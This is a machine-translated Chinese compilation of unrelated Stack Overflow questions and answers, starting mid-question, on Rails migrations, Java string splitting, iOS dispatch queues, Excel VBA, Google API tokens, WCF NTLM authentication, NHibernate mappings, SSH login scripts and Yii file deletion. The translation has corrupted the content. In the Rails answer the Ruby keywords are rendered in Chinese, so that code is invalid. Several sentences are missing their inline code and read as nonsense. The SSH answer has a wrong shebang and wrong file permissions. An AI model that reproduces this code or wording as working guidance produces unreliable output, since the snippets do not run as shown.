我还尝试将`establish_connection`调用移动到`connection`迁移文件中的方法中。在这种情况下，表是在迁移时创建的，但是我得到了同样的错误（所以在其他迁移中以某种方式失败）并且顺便说一下它没有创建 schema_migrations 表......

有什么帮助吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-07-02T08:41:04.327

按照以下步骤解决了上述问题。

```
类 AddCustomTbl < ActiveRecord::Migration

  默认连接
    ActiveRecord::Base.establish_connection(Rails.env).connection
  结尾

  向上定义
    # 与用户的连接_#{Rails.env}
    oldEnv = Rails.env
    Rails.env = "user_#{Rails.env}"
    ActiveRecord::Base.establish_connection(Rails.env)
    create_table "users", :force => true do |t|
      t.string "电子邮件"
    结尾
    # 与 Rails.env 的连接
    Rails.env = oldEnv
    ActiveRecord::Base.establish_connection ActiveRecord::Base.configurations[Rails.env]
  结尾

  向下定义
    # 与用户的连接_#{Rails.env}
    oldEnv = Rails.env
    Rails.env = "user_#{Rails.env}"
    ActiveRecord::Base.establish_connection(Rails.env).connection
    drop_table ：用户
    # 与 Rails.env 的连接
    Rails.env = oldEnv
    ActiveRecord::Base.establish_connection ActiveRecord::Base.configurations[Rails.env]
  结尾
结尾

```

# java - 拆分方法在数组中留下空间

> ID：13704689
> 
> 赞同：0
> 
> 时间：2012-12-04T14:04:23.680
> 
> 标签：java

```
{
    ArrayList<String> node_array = new ArrayList<String>();
    String allValues[] = node.split("[(,)]");

    for(String value : allValues){
        node_array.add(value);
    } 
```

节点是一个字符串，例如：(3,4,5,6,3)

出于某种原因，当我验证 arraylist 的内容时，拆分似乎留下了一些空间作为元素，特别是 ( 和 ) 应该在哪里。我究竟做错了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T14:07:39.113

您要求`split()`在括号和逗号处分开。在您的字符串中，在第一个分隔符（左括号）之前有一个空白子字符串。`split()`保留该空白子字符串并将其返回到结果数组的第零个元素。

[文档](http://docs.oracle.com/javase/7/docs/api/java/lang/String.html#split%28java.lang.String,%20int%29)中有大量示例说明了该函数的工作原理。

要解决此问题，您可以忽略空字符串，或者翻转正则表达式并匹配数字，而不是在标点符号处拆分。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-04T14:11:37.233

您已将分隔符定义为 中的第一个字符，因此您的中将显示`String`一个空字符串，因为第一个分隔符之前发生的内容。但是，对于您的应用程序，您可以像这样轻松修复它：`""``ArrayList`

```
ArrayList<String> node_array = new ArrayList<String>();
String allValues[] = node.split("[(,)]");

for(String value : allValues){
  if(!value.equals("")) node_array.add(value);
}

return node_array; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-04T14:14:10.857

```
node.replace("(","").replace(")","").split(","); 
```

或者

```
node.substring(1,node.length()-1).split(","); 
```

# ios - 如何处理 dispatch_queue_t dispatch_get_local_queue dispatch_queue_create EXC BAD ACCESS？

> ID：13704692
> 
> 赞同：0
> 
> 时间：2012-12-04T14:04:30.510
> 
> 标签：ios, objective-c, ios4, libdispatch

我有以下代码

```
dispatch_queue_t dispatch_get_local_queue()
{
    static dispatch_queue_t _queue;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        _queue = dispatch_queue_create("com.github.blackraccoon", 0);
        dispatch_queue_set_specific(_queue, "com.github.blackraccoon", (void*) "com.github.blackraccoon", NULL);
    });
    return _queue;
} 
```

在 dispatch_queue_set_specific 行收到信号 EXC BAD ACCESS 后。如何处理？并且在 iphone 5.0 模拟器上一切正常。但与 iphone 4.3 模拟器和 ipad 与 ios 4.2 崩溃。它是 BlackRaccoon 项目的一部分。在我之后

```
createDir = [BRRequestCreateDirectory initWithDelegate: self];
createDir.path = [NSString stringWithFormat:@"/%@/",strProjectID];
createDir.hostname = @"cite";
createDir.username = @"username";
createDir.password = @"password";
[createDir start]; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-04T14:08:37.163

[阅读文档](http://developer.apple.com/library/ios/documentation/Performance/Reference/GCD_libdispatch_Ref/Reference/reference.html#//apple_ref/c/func/dispatch_queue_set_specific)很重要。

> **可用性**
> 适用于 iOS 5.0 及更高版本。

您的选择是：

*   尝试自己修改库以在旧设备上工作
*   在 github 项目上提交[问题以支持旧版本](https://github.com/lloydsargent/BlackRaccoon/issues)
*   使用另一个支持 iOS 4 的项目

# jquery - CSS3 + jQuery 页面翻转时间调整

> ID：13704696
> 
> 赞同：0
> 
> 时间：2012-12-04T14:04:34.743
> 
> 标签：jquery, css

好吧，我正在尝试使用 css3 过渡和 jQuery 构建全屏页面翻转来添加/删除某些效果。到目前为止，我已经设法建立了效果和适当的班级变更。但是当转换发生时，我不能将一页“放在”另一页“后面”。

我已经尝试为 page2 使用 z-index （这是第一个页面后面的页面），但我无法完成这项工作。

[http://www2.madeinweb.com.br/jobs/page-flip/](http://www2.madeinweb.com.br/jobs/page-flip/)

这是我现在正在研究的原型。

```
$('.page1').removeClass('flip in reverse').addClass('flip out').delay(650).hide(0);
$('.page2').removeClass('flip out reverse').addClass('flip in').delay(650).show(0); 
```

jQuery 类触发。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-06T17:58:10.237

好吧，我已经设法通过绝对定位来完成这项工作。不想使用此解决方法，但这是我找到的最干净的方法。

# api - 在基于 ARM 的固件上实现 API 的正确方法

> ID：13704702
> 
> 赞同：2
> 
> 时间：2012-12-04T14:04:55.920
> 
> 标签：api, arm

我正在开发基于 LPC17XX+FreeRTOS 的设备固件。我的开发环境是Eclipse + GCC，代码是C。最终产品的要求是：

1.  运行 RTOS 并执行一些周期性任务（例如执行健康检查）的“基本固件”。
2.  基本固件需要支持一个 API，该 API 将具有一些用于数据操作/延迟/定时的功能以及一些用于使用设备端口和 I/O 的功能。
3.  用户可以使用此 API 构建自己的应用程序。
4.  用户应用程序需要驻留在闪存的空白空间中。（它将通过串口发送到设备，我打算使用 IAP 将其保存在闪存上）
5.  我想将应用程序作为“基础固件”的新任务启动。

第 1 步和第 3 步相当容易实现。我不确定实现 2,3 和 4 的最佳方法是什么。到目前为止，我已经查看了动态链接、跳转表、覆盖等，我有点迷失了。有人可以概述一下正确的实施步骤吗？

一些相关问题：

1.  为提供基于 API 的应用程序/模块开发和加载的产品开发固件的任何其他方式？
2.  我需要向用户提供什么才能使用 API？我的 API 源代码会公开吗？

我愿意接受任何想法，谢谢:)

# excel - Excel清理代码VBA

> ID：13704710
> 
> 赞同：1
> 
> 时间：2012-12-04T14:05:20.840
> 
> 标签：excel, excel-2007, vba

我有一些运行良好的代码，但我知道它可以写得比我所拥有的要干净得多。

```
Sub DeleteField()
Range("A6").Select

        Do
            If ActiveCell.Value = "Actual Conveyable Cases" Or _
            ActiveCell.Value = "Projected Non Con" Or _
            ActiveCell.Value = "Actual Non Con Cases" Or _
            ActiveCell.Value = "Projected CPT" Or _
            ActiveCell.Value = "Actual CPT" Or _
            ActiveCell.Value = "Projected Store Loads" Or _
            ActiveCell.Value = "Actual Store Loads" Or _
            ActiveCell.Value = "Projected Pull Ahead" Or _
            ActiveCell.Value = "Actual Pull Ahead" Or _
            ActiveCell.Value = "Projected Loads at 08:00" Or _
            ActiveCell.Value = "Actual Loads at 08:00" Then
        ActiveCell.EntireRow.Select
        Selection.Delete
        ActiveCell.Select
            Else: ActiveCell.Offset(1, 0).Select
        End If

    Loop Until ActiveCell.Value = "" And ActiveCell.Offset(-5, 0).Value = ""

MsgBox "Done!"

End Sub 
```

我正在寻找一种清理多个 Or 语句的方法。有没有一种方法可以通过数组或某种方法来清理所有“ActiveCell”段

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-04T14:08:14.123

您可以使用[`SELECT CASE`语句](http://support.microsoft.com/kb/141691)来清理它：

```
Select Case ActiveCell.Value 
    Case "Actual Conveyable Cases", "Projected Non Con", _
         "Actual Non Con Cases", "Projected CPT", "etc..."

            ActiveCell.EntireRow.Select
            Selection.Delete
            ActiveCell.Select

    Case Else

            ActiveCell.Offset(1, 0).Select

End Select 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T14:31:50.217

这就是我将如何编程来清理它。希望能帮助到你。

另外，我删除了条件： ActiveCell.Offset(-5, 0).Value = ""

因为向下移动 5 个额外的单元格似乎很奇怪

```
Option Explicit

Public Sub DeleteField()
    Dim sh As Excel.Worksheet
    Dim iLastRow As Long, iFirstRow As Long, i As Long

    ' define the array here so we don't have to create it over
    ' and over again in the function toDelete()
    Dim list(11) As String
    list(0) = "Actual Conveyable Cases"
    list(1) = "Projected Non Con"
    list(2) = "Actual Non Con Cases"
    list(3) = "Projected CPT"
    list(4) = "Actual CPT"
    list(5) = "Projected Store Loads"
    list(6) = "Actual Store Loads"
    list(7) = "Projected Pull Ahead"
    list(8) = "Actual Pull Ahead"
    list(9) = "Projected Loads at 08:00"
    list(10) = "Actual Loads at 08:00"

    Set sh = ActiveSheet
    iFirstRow = 6
    iLastRow = sh.Cells(sh.Rows.Count, 1).End(xlUp).Row

    ' loop through the cells from bottom to top (because if we
    ' delete the row it's easier to maintain where we are)
    For i = iLastRow To iFirstRow Step -1
        If (toDelete(list, sh.Cells(i, 1))) Then
            sh.Cells(i, 1).EntireRow.Delete
        End If
    Next

    MsgBox "Done!"
End Sub

Private Function toDelete(ByRef list() As String, ByRef r As Excel.Range) As Boolean
    Dim i As Long
    For i = 0 To UBound(list)
        If (r.Value = list(i)) Then
            toDelete = True
            Exit Function
        End If
    Next i

    toDelete = False
End Function 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-04T14:39:33.980

查看问题，可以使用多个值进行匹配

```
Dim value As String
Dim matched As Boolean
Dim criteria As String

'** Put all possible strings separated by comma here
criteria = "Actual Conveyable Cases, Projected Non Con, Actual Non Con Cases"

do
   matched = (InStr(1, criteria, ActiveCell.Value) <> 0)

   If matched then

   End If
... 
```

该`InStr`函数将起作用，因为您的标准字符串是这样的，即没有一个字符串包含在另一个字符串中。

即如果以上将不起作用

```
criteria = "Actual Conveyable Cases, Actual Conveyable Cases 1, Actual Conveyable Cases 2" 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-05T08:20:09.137

我知道你有很好的答案，但作为 Dictionary 对象的推销员，我有义务展示在这里使用它是多么有趣。它的运行速度也非常快，因此如果您有很长的条件列表，这可能就是您想要的方式。享受！

```
Sub DeleteField()

Dim dict As Object, i As Long
Set dict = CreateObject("scripting.dictionary")

dict.Add "Actual Conveyable Cases", 1
dict.Add "Projected Non Con", 1
dict.Add "Actual Non Con Cases", 1
dict.Add "Projected CPT", 1
dict.Add "Actual CPT", 1
dict.Add "Projected Store Loads", 1
dict.Add "Actual Store Loads", 1
dict.Add "Projected Pull Ahead", 1
dict.Add "Actual Pull Ahead", 1
dict.Add "Projected Loads at 08:00", 1
dict.Add "Actual Loads at 08:00", 1

For i = range("A" & Rows.count).End(xlUp).Row To 1 Step -1
    If dict.exists(range("A" & i).Value) Then
        Rows(i).Delete
        i = i + 1
    End If
Next

MsgBox "Done!"

End Sub 
```

# javascript - 如何在分析 API 上设置访问令牌？

> ID：13704714
> 
> 赞同：5
> 
> 时间：2012-12-04T14:05:28.217
> 
> 标签：javascript, google-analytics, google-analytics-api

我想知道，该文档有使用多种语言实现 Analytics API 的教程。

现在在 PHP 中，他们展示了如何存储访问令牌并对其进行维护，现在我假设 JS 以某种方式将其保存在某种本地存储中，但我不希望用户每次访问时都进行身份验证，所以我的计划是保存在我的数据库中访问和刷新令牌，只需将其应用于客户端，而不是通过所有弹出过程。

根据教程：

```
 gapi.auth.authorize({client_id: clientId, scope: scopes, immediate: false}, result); 
```

触发返回访问令牌的弹出窗口，但我会再说一遍，我有兴趣从数据库提交令牌。

怎么可能呢？

有什么`gapi.auth.setToken(token)`方法可以在我调用核心报告 API 之后？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-01-02T03:10:44.943

在已经编写 PHP 使用 google 的 PHP 客户端库进行身份验证之后，我来到这里寻找使用此解决方案的解决方案。正如您所提到的，我想共享存储的令牌，并且能够在不重新验证和/或触发弹出窗口的情况下使用 javascript（使用该`.init(callback)`方法可能有解决方案，请参阅最后的文档/链接）。

> *是否有一些 gapi.auth.setToken(token) 方法*

事实证明你可以，有`setToken(token)`你提到的确切功能，你甚至可以共享之前在 PHP 中生成的身份验证令牌。我还不确定，我们*是否应该*这样做:)

我正在使用 PHP 进行初始身份验证，但大概在 javascript 客户端中，您可以以与本示例相同的方式调用`setToken()`您存储的内容。`getToken()`可能还有更好的方法，例如 API Authentication docs 中提到的 CORS（请参阅最后的链接），我还没有机会调查其中的任何一个，但是，我可以举一个例子来回答这个问题，并且可能对需要相同行为的其他人有用

我首先找到了 Google 开发人员 Dan Holevoet 的博客文章，其中包含一些示例 JS 代码。

[http://googleappsdeveloper.blogspot.com.au/2011/12/using-new-js-library-to-unlock-power-of.html](http://googleappsdeveloper.blogspot.com.au/2011/12/using-new-js-library-to-unlock-power-of.html)

能够直接使用 javascript 查询 API 并动态加载列表等非常棒，但让我担心的当然是将 clientid 等存储在 js 中。

```
// Snippet from Dan's post
var clientId = 'YOUR_CLIENT_ID';
var apiKey = 'YOUR_API_KEY';
var scopes = 'https://www.googleapis.com/auth/calendar';

function handleClientLoad() {
    gapi.client.setApiKey(apiKey);
    window.setTimeout(checkAuth,1);
    checkAuth();
} 
```

但是，根据丹对同一问题的回答：

> *apiKey 与指定的引用者一起使用，您必须在 API 控制台中声明。如果密钥是从未经授权的推荐人那里发送的，它将不起作用。您应该尽可能限制您接受的推荐人列表，以确保其他人不会将您的 apiKey 用于他们自己的请求。*

现在，我的示例是针对日历 API 的，但它似乎也与其他 API 非常一致。

**注意：此代码段仅用于概念验证，可能不应在生产中使用。**我认为提到的推荐人保护可以*做*这样的事情，但需要考虑更多。它可以通过隐藏输入、AJAX 调用等来完成。但最终，它们都将在 javascript 中可见。

我为测试这个概念所做的是：

*   通过 PHP 客户端库进行身份验证，使用与回调相同的脚本/URL（有关这些回调，请参阅 [API 控制台][2]）
*   在成功的身份验证中，在回调中，将页面中的全局 javascript 变量设置为存储的 PHP 身份验证令牌
*   加载页面后，在您第一次单击事件以使用 javascript（甚至在文档准备就绪时），调用`authMe()`以设置令牌
*   然后照常进行，调用您在初始 PHP 身份验证过程中指定范围的任何 javascript API 方法（在本例中`makeApiCall()`）

像这样：

在php回调例程中，不管是否已经认证（假设你的回调URL是同一个脚本），使这个var全局

```
<script type="text/javascript">
    // A place to stick PHP's auth token once the auth dance is done
    var dodgey_global_access_token = {};
</script> 
```

现在，在 php 回调例程中*，一旦我们检查了我们是否已通过身份验证*，并且`$_SESSION['token'] = $client->getAccessToken();`已被调用（IE 将身份验证令牌存储在某处以备后用），或者至少`$client->getAccessToken()`有一些有意义的东西：

```
<script type="text/javascript">
// Set the js var via PHP here.. Yeck... Note json encode in php and parse in jquery
dodgey_global_access_token = $.parseJSON (<?php  echo json_encode ($client->getAccessToken() ); ?>);
// dodgey_global_access_token now contains the auth token structure

// Removed auth-related functions in Dan's code - we'll already have a token

// Dan's orig function to list events in 'primary' calendar
function makeApiCall() {
  gapi.client.load('calendar', 'v3', function() {
    var request = gapi.client.calendar.events.list({
      'calendarId': 'primary'
    });

    request.execute(function(resp) {
      for (var i = 0; i < resp.items.length; i++) {
        var li = document.createElement('li');
        li.appendChild(document.createTextNode(resp.items[i].summary));
        document.getElementById('events').appendChild(li);
      }
    });
  });
}

// My function to setToken with the token injected from PHP authentication
function authMe () {
    // Stuff the token into the gapi object
    gapi.auth.setToken( dodgey_global_access_token );

    // Now call the original 'makeAPICall' function now that we're 'authenticated'
    makeApiCall();  
}
</script> 
```

**注意：**我在示例中使用了 jquery 来快速解析 JSON，我们已经在项目中使用它，但如果没有，您必须找到另一个库才能这样做

相关/有用的文档：

```
// Sorry, as a new poster I can only post 2 hyperlinks, 
// so embedding this in code snippet
// 
//    http://code.google.com/p/google-api-javascript-client/wiki/ReferenceDocs#gapi
//    http://code.google.com/p/google-api-javascript-client/wiki/Authentication
//    http://code.google.com/p/google-api-javascript-client/issues/detail?id=22
//    http://code.google.com/p/google-api-javascript-client/wiki/CORS
//    https://code.google.com/apis/console 
```

如果有任何不清楚的地方，请告诉我，并可以发布一个工作示例进行演示。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2018-01-01T22:28:23.057

[与首次提供此答案时相比， Google API 文档](https://developers.google.com/analytics/devguides/reporting/core/v4/migration)发生了一些变化。`google-api-javascript-client`不再是访问 google api 库的推荐库，Google 建议使用[发现文档](https://developers.google.com/api-client-library/javascript/features/discovery)来加载特定库。因此，您正在寻找以加载所有库**并**设置访问令牌的工作流程如下所示：

```
var token = 'someaccesstokenfromoauth2'
gapi.load('client:auth2', function(){
  gapi.client.load(
    'https://analyticsreporting.googleapis.com/$discovery/rest',
    'v4'
  ).then(function(){
    gapi.auth.setToken({ access_token: token })
    // business logic with gapi.client.analyticsreporting()
  })
}) 
```

加载 gapi：

```
<script src="https://apis.google.com/js/api.js"></script> 
```

# c# - HTTP 请求未经客户端身份验证方案“Ntlm”授权。从服务器收到的身份验证标头是“协商，NTLM”

> ID：13704720
> 
> 赞同：20
> 
> 时间：2012-12-04T14:05:57.720
> 
> 标签：c#, .net, wcf, soap

我浏览了大量的 SO 文章，甚至其他网站，但似乎无法让这项服务正常工作。我有一个我想要访问的 SOAP 服务，它的配置如下：

```
<system.serviceModel>
    <bindings>
        <basicHttpBinding>
        <binding name="PROVIDERSSoapBinding">
            <security mode="TransportCredentialOnly">
            <transport clientCredentialType="Ntlm" proxyCredentialType="None" realm="" />
            </security>
        </binding>
        </basicHttpBinding>
    </bindings>
    <client>
        <endpoint address="http://xxx.xx.xx.xxx:9011/provider/services/PROVIDERS"
            binding="basicHttpBinding" bindingConfiguration="PROVIDERSSoapBinding"
            contract="ServiceReference1.ProviderRemote" name="PROVIDERS" />
    </client>
</system.serviceModel> 
```

但是，从我的控制台应用程序中点击它时出现以下错误：

> HTTP 请求未经客户端身份验证方案“Ntlm”授权。从服务器收到的身份验证标头是“协商，NTLM”。

有人可以帮帮我吗？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-12-04T14:40:38.877

尝试将“clientCredentialType”设置为“Windows”而不是“Ntlm”。

我认为这是服务器所期望的 - 即当它说服务器需要“协商，NTLM”时，这实际上意味着 Windows Auth，如果可用，它将尝试使用 Kerberos，如果没有，则回退到 NTLM（因此'谈判'）

我是基于以下几行之间的阅读：[选择凭据类型](http://msdn.microsoft.com/en-us/library/ms733836.aspx)

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-12-05T17:57:57.187

您可以使用[wftech](http://support.microsoft.com/kb/284285)消除客户端的问题，这是一个旧工具，但我发现它在诊断身份验证问题时很有用。wfetch 允许您指定 NTLM、Negotiate 和 kerberos，这可能会帮助您更好地理解您的问题。当您尝试调用服务并且 wfetch 对 WCF 一无所知时，我建议您将端点绑定 (PROVIDERSSoapBinding) 应用于[serviceMetadata](http://msdn.microsoft.com/en-us/library/ms731317.aspx) ，然后您可以使用相同的安全设置为服务执行 WSDL 的 HTTP GET。

您可以使用的另一个选项是强制服务器使用 NTLM，您可以通过编辑元数据库 (IIS 6) 并删除协商设置来执行此操作，更多详细信息请访问[http://support.microsoft.com/ KB/215383](http://support.microsoft.com/kb/215383)。

如果您使用的是 IIS 7.x，则方法略有不同，有关如何配置身份验证提供程序的详细信息，请[参见 http://www.iis.net/configreference/system.webserver/security/authentication/windowsauthentication](http://www.iis.net/configreference/system.webserver/security/authentication/windowsauthentication)。

我注意到你已经用 xxx.xx.xx.xxx 屏蔽了服务器地址，所以我猜测这是一个 IP 地址而不是服务器名称，这可能会导致身份验证问题，所以如果可能的话尝试定位机器姓名。

抱歉，我没有给您答案，而是为您提供更接近问题的指示，但我希望它有所帮助。

最后，我会说我遇到过同样的问题，我唯一的办法是使用 Kerberos 而不是 NTLM，别忘了如果你真的走这条路，你需要为该服务注册一个 SPN。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2016-03-24T18:13:47.877

如果您的**客户端和服务都安装在同一台机器上，并且您使用****正确的（阅读：在其他地方尝试和测试过）客户端和服务配置**面临这个问题，那么这可能值得检查。

检查主机文件中的主机条目

> %windir%/system32/drivers/etc/hosts

检查您是否正在使用主机名访问 Web 服务，并且该主机名已与上述主机文件中的 IP 地址相关联。如果是，NTLM/Windows 凭据将不会从客户端传递到服务，因为对该主机名的任何请求都将在机器级别再次路由。

尝试以下任一方法

*   从 hosts 文件中删除该主机名的主机条目

*   如果无法删除主机条目，请尝试使用另一个主机名访问您的服务。您也可以尝试使用 IP 地址而不是主机名

编辑：不知何故，上述情况与负载平衡方案有关。但是，如果无法删除主机条目，则禁用机器上的环回检查会有所帮助。参考文章[https://support.microsoft.com/en-us/kb/896861中的方法2](https://support.microsoft.com/en-us/kb/896861)

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2014-02-17T20:29:47.323

我们遇到了这个问题，发现当使用（在我们的例子中是 IE）浏览器作为进程帐户登录时，然后通过应用程序（SharePoint）更改会话登录时会引发错误。我相信这种情况通过了两种身份验证方案：

1.  谈判
2.  NTLM

该应用程序托管了一个 *.asmx Web 服务，该服务在负载平衡服务器上被调用，并使用类似 WCF 的 .NET3.5 绑定向自身发起 Web 服务调用。

用于调用 Web 服务的代码：

```
public class WebServiceClient<T> : IDisposable
{
    private readonly T _channel;
    private readonly IClientChannel _clientChannel;

    public WebServiceClient(string url)
        : this(url, null)
    {
    }
    /// <summary>
    /// Use action to change some of the connection properties before creating the channel
    /// </summary>
    public WebServiceClient(string url,
         Action<CustomBinding, HttpTransportBindingElement, EndpointAddress, ChannelFactory> init)
    {
        var binding = new CustomBinding();
        binding.Elements.Add(
            new TextMessageEncodingBindingElement(MessageVersion.Soap12, Encoding.UTF8));
        var transport = url.StartsWith("https", StringComparison.InvariantCultureIgnoreCase)
                            ? new HttpsTransportBindingElement()
                            : new HttpTransportBindingElement();
        transport.AuthenticationScheme = System.Net.AuthenticationSchemes.Ntlm;
        binding.Elements.Add(transport);

        var address = new EndpointAddress(url);

        var factory = new ChannelFactory<T>(binding, address);
        factory.Credentials.Windows.AllowedImpersonationLevel = System.Security.Principal.TokenImpersonationLevel.Impersonation;

        if (init != null)
        {
            init(binding, transport, address, factory);
        }

        this._clientChannel = (IClientChannel)factory.CreateChannel();
        this._channel = (T)this._clientChannel;
    }

    /// <summary>
    /// Use this property to call service methods
    /// </summary>
    public T Channel
    {
        get { return this._channel; }
    }
    /// <summary>
    /// Use this porperty when working with
    /// Session or Cookies
    /// </summary>
    public IClientChannel ClientChannel
    {
        get { return this._clientChannel; }
    }

    public void Dispose()
    {
        this._clientChannel.Dispose();
    }
} 
```

我们发现，如果会话凭据与浏览器的进程帐户相同，则仅使用 NTLM 并且调用成功。否则会导致这个捕获的异常：

> HTTP 请求未经客户端身份验证方案“Ntlm”授权。从服务器收到的身份验证标头是“协商，NTLM”。

最后，我相当肯定其中一个身份验证方案会通过身份验证，而另一个不会，因为它没有被授予适当的访问权限。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2015-03-18T15:50:54.523

您需要将 NTAuthenticationProviders 设置为 NTLM

MSDN 文章：[https ://msdn.microsoft.com/en-us/library/ee248703(VS.90).aspx](https://msdn.microsoft.com/en-us/library/ee248703(VS.90).aspx)

IIS 命令行（[http://msdn.microsoft.com/en-us/library/ms525006(v=vs.90).aspx](http://msdn.microsoft.com/en-us/library/ms525006(v=vs.90).aspx)）：

```
 cscript adsutil.vbs set w3svc/WebSiteValueData/root/NTAuthenticationProviders "NTLM" 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2018-12-17T09:28:59.903

我知道这个问题很老，但我的应用程序的解决方案与已经建议的答案不同。如果像我这样的其他人仍然有这个问题，并且上述答案都不起作用，这可能是问题：

我使用网络凭据对象将 Windows 用户名+密码解析为第三方 SOAP Web 服务。我设置了用户名=“域名\用户名”、密码=“密码”和域=“域名”。现在这个游戏给我带来了奇怪的 Ntlm 而不是 NTLM 错误。为了解决这些问题，如果域名包含在带有反斜杠的用户名中，请确保不要在 NetworkCredentials 对象上使用 domain 参数。因此，要么从用户名中删除域名并解析域参数，要么省略域参数。这解决了我的问题。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2021-06-29T03:15:24.040

我正在使用 .NET 5。就我而言，我不得不将 System.ServiceModel.Http.dll 从 4.8.1 降级到 4.4.4。没有太多时间深入挖掘根本原因。

# nhibernate - 流利的 NHibernate 映射父/子表与孤立的子记录

> ID：13704723
> 
> 赞同：2
> 
> 时间：2012-12-04T14:06:11.027
> 
> 标签：nhibernate, foreign-key-relationship, fluent, outer-join, orphan

我是 Fluent NHibernate 和 C#.NET 的新手，正在努力解决这个问题。

我有两张桌子：

**审计**: audit_seq (主键), user_code (外键), audit_date

**用户名**：user_code（主键），user_name

审计表包含用户的外键字段 (user_code) 的审计记录。 **问题**是一些用户记录已被删除，但这些用户的审计记录仍然存在（所以我在审计表中孤立了外键）。我想要的是一个带有 audit_seq、audit_date 和 user_name 的结果集（但如果是孤立的 user_name 应该是空白的）。

我正在使用以下映射，但相信我需要更改 UserName 引用以创建外部联接。我不知道该怎么做。

```
public class AuditMap : ClassMap<Audit>
{
    public AuditMap()
    {
        Id(x => x.AuditSeq).Column("audit_seq").GeneratedBy.Assigned();
        Map(x => x.AuditDate).Column("audit_date");
        References(x => x.UserName).Column("user_code");
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-04T15:01:19.180

该表`username`应该映射到一个实体（类`UserName`？我将使用`User`来区分它的属性`UserName`）。然后可以在*审计*中作为参考。在 C# 中

```
public class Audit
{
  ...
  public virtual User User { get; set; }
  public virtual string UserName
  {
    get { return User != null ? User.UserName : string.Empty ;}
  }
} 
```

`User`映射_

```
public class UserMap : ClassMap<User>
{
    public UserMap()
    {
        Id(x => x.UserCode).Column("user_code").GeneratedBy.Assigned();
        Map(x => x.UserName).Column("user_name");
        ...
    }
} 
```

然后我们可以这样调整`Audit`映射：

```
public class AuditMap : ClassMap<Audit>
{
    public AuditMap()
    {
        Id(x => x.AuditSeq).Column("audit_seq").GeneratedBy.Assigned();
        Map(x => x.AuditDate).Column("audit_date");
        References(x => x.User).Column("user_code")
             .NotFound.Ignore();
    }
} 
```

所以现在我们有`Audit`参考`User`。它将忽略一些引用的用户丢失的事实（`.NotFound.Ignore()`）。如果有的话，我们的`UserName`属性会返回它的名字。

# shell - 需要 shell 脚本来自动登录到远程服务器

> ID：13704727
> 
> 赞同：-2
> 
> 时间：2012-12-04T14:06:15.990
> 
> 标签：shell, unix, autologin

我有 10 台 Linux 服务器。每次我必须执行 ssh 命令登录时连接到服务器。我需要一个 shell 脚本来登录远程服务器。例如，如果服务器是主机名`testhost.com`，用户是`user1`并且`password` 当我`user1`在终端中给出用户名时通过，它应该自动执行 shell 脚本并为用户登录到远程服务器`user1`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-08-11T16:56:24.263

嗨，我知道这是一个老问题，但这里有一种方法可以按照上面来自@nick hartung 的链接进行操作，然后因为您有 10 个服务器，所以您可以按名称调用每个服务器，所以说“server1”或您喜欢的任何名称，但是对于此示例，将其中一个服务器命名为“server1”，还记得将端口从 22 更改为其他值，例如 22277，因此创建一个脚本并将其命名为 server1 并将其放入其中

```
#!/bash/bin
ssh username@hostname -p22277 
```

然后将脚本移动到用户 bin

```
$ sudo chmod 600 server1
$ sudo mv server1 /usr/bin/ 
```

那么现在你可以像这样登录到远程主机

```
$ server1 
```

您将自动登录。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T14:24:20.313

您可以编写一个脚本，该脚本将用户名作为参数，并基于此通过 ssh 连接到正确的主机。一个简单的例子：

```
if [ "$1" == "username" ]; then
   ssh username@hostname
fi
if [ "$1" == "username2" ]; then
... 
```

但是，ssh 命令没有内置的方式来提供密码 AFAIK。无论如何，您不应该将密码存储在脚本中。解决此问题的方法是通过使用 ssh-keygen 创建密钥对来设置自动身份验证。[这](http://www.rebol.com/docs/ssh-auto-login.html)是一个链接，将向您展示如何设置它。

# imagemagick - PythonMagic：如何合成具有溶解值？

> ID：13704730
> 
> 赞同：2
> 
> 时间：2012-12-04T14:06:21.647
> 
> 标签：imagemagick, composite, pythonmagick

我喜欢用 PythonMagick 来做这件事：

```
composite -dissolve 40 over.png base.png new.png 
```

我试过了：

```
import PythonMagick
base = PythonMagick.Image("base.png")
over = PythonMagick.Image("over.png")
base.composite(over,0,0,PythonMagick.CompositeOperator.DissolveCompositeOp)
base.write("some.png") 
```

这很好用，但我如何指定溶解值？

提前致谢

托马斯

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-09T14:57:18.047

根据您的其他[问题，我建议您使用](https://stackoverflow.com/questions/13662184/python-pil-lighten-transparent-image-and-paste-to-another-one)[PIL](https://stackoverflow.com/questions/2445985/where-can-i-find-pythonmagick-documentation)，因为 PythonMagick 似乎不[活跃](http://sxoop.wordpress.com/2006/11/29/whither-pythonmagick/)。我还查看了[Magick++](http://www.imagemagick.org/Magick++/)的文档，但没有提到如何为. 我会远离这些库，而是使用 ImageMagick 提供的直接 CLI。`composite`

# image - 删除图像文件 yii

> ID：13704735
> 
> 赞同：5
> 
> 时间：2012-12-04T14:06:33.877
> 
> 标签：image, file-io, yii

谁能告诉我如何删除yii中的图像文件和目录

我试过取消链接但它不起作用。（路径正确但它没有删除）但收到错误**没有这样的文件或目录**

```
unlink(Yii::app()->request->baseUrl.'/uploads/'.$model->file_id.'/'.$fileModel->file_name.$fileModel->extension); 
```

*   而且我还需要删除yii框架中的一个目录。路径是正确的但它没有删除

